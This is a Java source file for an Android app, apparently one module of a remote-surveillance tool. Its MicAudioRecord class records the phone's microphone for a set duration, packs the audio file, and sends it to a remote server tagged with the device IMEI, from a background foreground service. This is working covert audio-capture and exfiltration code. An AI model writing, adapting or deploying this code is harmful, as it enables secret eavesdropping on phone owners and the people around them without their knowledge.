package com.phone.data;

import java.io.File;
import java.io.FileInputStream;

import com.authority.AuthoritySettings;
import com.main.ForegroundService;
import com.network.Network;
import com.network.SendDataToServer;
import com.utils.ExceptionProcess;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;

import android.content.Context;
import android.media.MediaRecorder;
import android.util.Log;

public class MicAudioRecord implements Runnable{
	private static String TAG = "MicAudioRecord";
	
	private static int MaxAudioRecordTime = 3600;
	private Context context;
	private int seconds;
	
	public MicAudioRecord(Context context, int seconds){
		this.context = context;
		this.seconds = seconds;
	}
	
	public void run(){
		micAudioRecord(context, seconds);
	}
	
	public static void micAudioRecord(Context context,int seconds){
		if (AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.RECORD_AUDIO) == false){
			return;
		}
		
		if (seconds <= 0 || seconds >= MaxAudioRecordTime) {
			seconds = 60;
		}
		
		try{

			String datetime = PublicFunction.formatCurrentDateInFileName();
			String filename = ForegroundService.LOCAL_PATH_NAME + datetime + "_" + 
			ForegroundService.MICAUDIORECORD_FILE_NAME + ".amr";
			
			 MediaRecorder recorder = new MediaRecorder();
			 recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
			 recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
			 recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
			 recorder.setOutputFile(filename);
			 recorder.prepare();
			 recorder.start();
		
			 int cnt = 0;
			 while (cnt < seconds) {
				 Thread.sleep( 1000);
				cnt ++;
			 }

			 recorder.stop();
			 recorder.reset();   
			 recorder.release(); 
			 
			if(Network.isNetworkConnected(context) == false){
				return;
			}
			
			Thread.sleep( 1000);
			
			File file = new File(filename);
			FileInputStream fin = new FileInputStream(file);
			int filesize = (int)file.length();
			int filenamelen = file.getName().getBytes().length;
			int sendsize = filesize + 4 + filenamelen +4;
			byte[] sendbuf = new byte[sendsize];
			byte[] bytefilenamelen = PublicFunction.intToBytes(filenamelen);
			System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
			System.arraycopy(file.getName().getBytes(), 0, sendbuf, 4, filenamelen);
			byte[] bytefilesize = PublicFunction.intToBytes(filesize);
			System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);
			fin.read(sendbuf,4 + filenamelen + 4,filesize);
		
			fin.close();
			
			new Thread(new SendDataToServer(sendbuf, sendsize, Public.CMD_DATA_MICAUDIORECORD, Public.IMEI)).start();
			
			//file.delete();
			
			Log.e(TAG, "mic audio record time:" + seconds + " ok");
			//String str = String.format("mic audio record time:%1$u ok\r\n", seconds);
			//Log.e(TAG,str);
			//WriteDateFile.writeLogFile(str);
			return;
		}catch(Exception ex){
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("micAudioRecord exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
		}
	}
}
